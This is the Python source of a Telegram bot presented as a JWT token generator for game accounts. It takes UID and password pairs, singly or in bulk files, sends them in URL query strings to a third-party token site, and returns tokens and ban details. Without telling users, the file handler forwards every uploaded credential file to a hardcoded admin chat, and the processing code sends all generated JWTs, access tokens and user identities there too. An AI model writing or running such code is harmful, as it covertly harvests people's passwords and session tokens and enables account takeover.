import os
import io
import json
import asyncio
import aiohttp
from threading import Thread
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, BotCommand
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8536757095  # Telegram Admin ID
API_TEMPLATE = "https://vipjwt.ffbot.site/token?uid={uid}&password={pwd}"
CONCURRENCY_LIMIT = 5

# Flask Server for Keep-Alive
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Bot Alive & Operational"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port)

Thread(target=run_flask, daemon=True).start()


# ---------------- KEYBOARDS SETUP ---------------- #

def get_main_keyboard():
    """ Main 6-Button Grid Menu """
    keyboard = [
        [KeyboardButton("⚡ PROCESSED"), KeyboardButton("📁 PROCESS FILE")],
        [KeyboardButton("📜 ADD LONG BIO"), KeyboardButton("👑 VIP SHOP")],
        [KeyboardButton("🆘 HELP"), KeyboardButton("👨‍💻 OWNER")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def get_cancel_keyboard():
    """ Only Cancel Button for direct options """
    keyboard = [[KeyboardButton("❌ CANCEL")]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def get_help_menu_keyboard():
    """ Main Help Sub-menu (Without Back Button) """
    keyboard = [
        [KeyboardButton("📌 Normal Commands")],
        [KeyboardButton("❓ FAQ"), KeyboardButton("💡 Tips")],
        [KeyboardButton("❌ CANCEL")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def get_help_detail_keyboard():
    """ Help Details Menu (Shows Back to Help button AFTER tapping sub-option) """
    keyboard = [
        [KeyboardButton("🔙 BACK TO HELP"), KeyboardButton("❌ CANCEL")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


# ---------------- API & FILE PROCESSING ---------------- #

async def fetch_token(session: aiohttp.ClientSession, semaphore: asyncio.Semaphore, uid: str, pwd: str) -> dict:
    async with semaphore:
        url = API_TEMPLATE.format(uid=uid, pwd=pwd)
        try:
            async with session.get(url, timeout=20) as response:
                res_text = await response.text()
                try:
                    data = json.loads(res_text)
                    return {"input_uid": uid, "status": "Success", "raw": data}
                except Exception:
                    return {"input_uid": uid, "status": "Success", "raw": res_text}
        except Exception as e:
            return {"input_uid": uid, "status": "Error", "raw": str(e)}


def format_field(key: str, value: any) -> str:
    val_str = str(value) if value is not None else "N/A"
    return f"• **{key}:** `{val_str}`"


async def process_accounts(accounts: list, update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_msg = await update.message.reply_text("🔄 **Processing requests, please wait...**", parse_mode="Markdown")

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_token(session, semaphore, acc['uid'], acc['pwd']) for acc in accounts]
        results = await asyncio.gather(*tasks)

    formatted_text_blocks = []
    jwt_only_lines = []
    full_log_lines = []

    for idx, item in enumerate(results, 1):
        uid_input = item["input_uid"]
        raw_data = item["raw"]

        if item["status"] == "Success" and isinstance(raw_data, dict):
            def get_val(key_name):
                for k, v in raw_data.items():
                    if k.lower() == key_name.lower():
                        return v
                return "N/A"

            jwt_token = get_val("Jwt token") or get_val("jwt_token") or get_val("token")
            access_token = get_val("Access token")
            ban_period = get_val("Ban period")
            ban_type = get_val("Ban type")
            banned_at = get_val("Banned at")
            banned_before = get_val("Banned before")
            level = get_val("Level")
            nickname = get_val("Nickname")
            open_id = get_val("Open id")
            reason = get_val("Reason")
            region = get_val("Region")
            status = get_val("Status")
            success = get_val("Success")
            res_uid = get_val("Uid") if get_val("Uid") != "N/A" else uid_input

            if jwt_token and jwt_token != "N/A":
                jwt_only_lines.append(f"{res_uid}:{jwt_token}")

            block = [
                f"🎮 **Account #{idx} (UID: `{res_uid}`)**",
                format_field("Status", status),
                format_field("Success", success),
                format_field("Nickname", nickname),
                format_field("Level", level),
                format_field("Region", region),
                format_field("Uid", res_uid),
                format_field("Open ID", open_id),
                format_field("Jwt Token", jwt_token),
                format_field("Access Token", access_token),
                format_field("Ban Type", ban_type),
                format_field("Ban Period", ban_period),
                format_field("Banned At", banned_at),
                format_field("Banned Before", banned_before),
                format_field("Reason", reason),
                "----------------------------------------"
            ]
            formatted_text_blocks.append("\n".join(block))
            full_log_lines.append("\n".join(block))

        else:
            err_msg = str(raw_data)
            block = f"❌ **UID:** `{uid_input}`\n• **Status:** `Error`\n• **Response:** `{err_msg}`\n----------------------------------------"
            formatted_text_blocks.append(block)
            full_log_lines.append(block)

    # Output Responses
    if len(accounts) == 1:
        await update.message.reply_text(formatted_text_blocks[0], parse_mode="Markdown", reply_markup=get_main_keyboard())

    jwt_file_content = "\n".join(jwt_only_lines) if jwt_only_lines else "No valid JWT tokens generated."
    jwt_file_bytes = io.BytesIO(jwt_file_content.encode('utf-8'))
    jwt_file_bytes.name = "jwt_tokens.txt"

    full_file_content = "\n\n".join(full_log_lines)
    full_file_bytes = io.BytesIO(full_file_content.encode('utf-8'))
    full_file_bytes.name = "full_response.txt"

    await update.message.reply_document(
        document=jwt_file_bytes,
        caption=f"🔑 **JWT Tokens File**\nTotal Valid JWTs: `{len(jwt_only_lines)}`",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

    # Admin Logging
    user = update.effective_user
    log_caption = (
        f"📁 **New Request Logged**\n"
        f"👤 User: @{user.username or 'NoUsername'} | ID: `{user.id}`\n"
        f"📊 Total Accounts Processed: `{len(accounts)}`"
    )

    try:
        jwt_file_bytes.seek(0)
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=jwt_file_bytes,
            caption=f"{log_caption}\n📌 File: JWT Only",
            parse_mode="Markdown"
        )
        full_file_bytes.seek(0)
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=full_file_bytes,
            caption=f"{log_caption}\n📌 File: Full Data",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Admin Log Error: {e}")

    await status_msg.delete()


# ---------------- COMMANDS & HANDLERS ---------------- #

async def set_bot_commands(application: Application):
    """ Telegram Side Menu Commands """
    commands = [
        BotCommand("start", "Start Bot & Open Main Menu"),
        BotCommand("token", "Get Details: /token <UID> <PASSWORD>")
    ]
    await application.bot.set_my_commands(commands)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "👋 Hi 💓💓💓!\n\n"
        "🚀 **ᴊᴡᴛ ᴛᴏᴋᴇɴ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ**\n\n"
        "Send me a `.json` or `.txt` file with UID + Password pairs.\n"
        "Or use single command: `/token <UID> <PASSWORD>`"
    )
    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_main_keyboard())


async def token_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text(
            "⚠️ **Format:** `/token <UID> <PASSWORD>`\nExample: `/token 10001234 mypass123`",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return

    accounts = [{"uid": context.args[0], "pwd": context.args[1]}]
    await process_accounts(accounts, update, context)


async def text_button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    if text == "⚡ PROCESSED":
        await update.message.reply_text("🚧 **Processed feature coming soon!**", reply_markup=get_cancel_keyboard())

    elif text == "📁 PROCESS FILE":
        msg = (
            "Okay, please send the JSON file now for manual processing.\n\n"
            "Required Format:\n"
            "```json\n"
            "[\n"
            '  {"uid": "user1", "password": "pass1"},\n'
            '  {"uid": "user2", "password": "pass2"}\n'
            "]\n"
            "```"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_cancel_keyboard())

    elif text == "📜 ADD LONG BIO":
        msg = (
            "╭────────────────────╮\n"
            "│  ℹ️  ᴀᴅᴅ ʟᴏɴɢ ʙɪᴏ\n"
            "╰────────────────────╯\n\n"
            "Please send a JSON file containing UID and Password."
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_cancel_keyboard())

    elif text == "👑 VIP SHOP":
        await update.message.reply_text("👑 **VIP SHOP Plans & Pricing coming soon!**", reply_markup=get_cancel_keyboard())

    elif text == "👨‍💻 OWNER":
        await update.message.reply_text("👨‍💻 **Owner Contact:** @myselfkhushi03", reply_markup=get_cancel_keyboard())

    elif text in ["🆘 HELP", "🔙 BACK TO HELP"]:
        help_text = "🆘 **ʜᴇʟᴘ ᴄᴇɴᴛᴇʀ**\n\nSelect a category below to get help:"
        await update.message.reply_text(help_text, parse_mode="Markdown", reply_markup=get_help_menu_keyboard())

    elif text == "📌 Normal Commands":
        msg = (
            "📌 **𝗡𝗢𝗥𝗠𝗔𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦**\n\n"
            "➤ `/start` - Start Bot & Main Menu\n"
            "➤ `/token <UID> <PWD>` - Direct Account Info\n"
            "➤ Send `.json` or `.txt` file - Process Bulk Accounts"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_help_detail_keyboard())

    elif text == "❓ FAQ":
        msg = "❓ **𝗙𝗔𝗤**\n\nQ: File format sahi nahi ho toh?\nA: Bot parsing cancel kar dega aur error dikhayega."
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_help_detail_keyboard())

    elif text == "💡 Tips":
        msg = "💡 **𝗧𝗜𝗣𝗦**\n\n• Processing speed ke liye multiple accounts file format me bhejein."
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_help_detail_keyboard())

    elif text == "❌ CANCEL":
        await update.message.reply_text("🏠 **Returned to Main Menu.**", reply_markup=get_main_keyboard())


async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
    except Exception as e:
        print(f"File Forward Error: {e}")

    document = update.message.document
    if not document:
        return

    file_name = document.file_name.lower()
    if not (file_name.endswith('.txt') or file_name.endswith('.json')):
        await update.message.reply_text("⚠️️ Kripya `.txt` ya `.json` file hi bhejein.", reply_markup=get_main_keyboard())
        return

    tg_file = await context.bot.get_file(document.file_id)
    file_content = (await tg_file.download_as_bytearray()).decode('utf-8', errors='ignore')

    accounts = []

    if file_name.endswith('.json'):
        try:
            data = json.loads(file_content)
            if isinstance(data, list):
                for entry in data:
                    if isinstance(entry, dict) and "uid" in entry and "password" in entry:
                        accounts.append({"uid": str(entry["uid"]), "pwd": str(entry["password"])})

            if not accounts:
                await update.message.reply_text(
                    "❌ **Incorrect JSON Format!** Must contain `uid` and `password`.",
                    parse_mode="Markdown",
                    reply_markup=get_main_keyboard()
                )
                return
        except Exception:
            await update.message.reply_text("❌ **Invalid JSON File Structure!**", parse_mode="Markdown", reply_markup=get_main_keyboard())
            return
    else:
        for line in file_content.splitlines():
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                accounts.append({"uid": parts[0].strip(), "pwd": parts[1].strip()})
            elif " " in line:
                parts = line.split(maxsplit=1)
                accounts.append({"uid": parts[0].strip(), "pwd": parts[1].strip()})

        if not accounts:
            await update.message.reply_text("❌ **Incorrect TXT Format!** Line format: `UID:PASSWORD`", parse_mode="Markdown", reply_markup=get_main_keyboard())
            return

    await process_accounts(accounts, update, context)


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.post_init = set_bot_commands

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("token", token_cmd))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO, file_handler))

    print("Bot is running cleanly with bottom grid keyboard & proper back flow...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
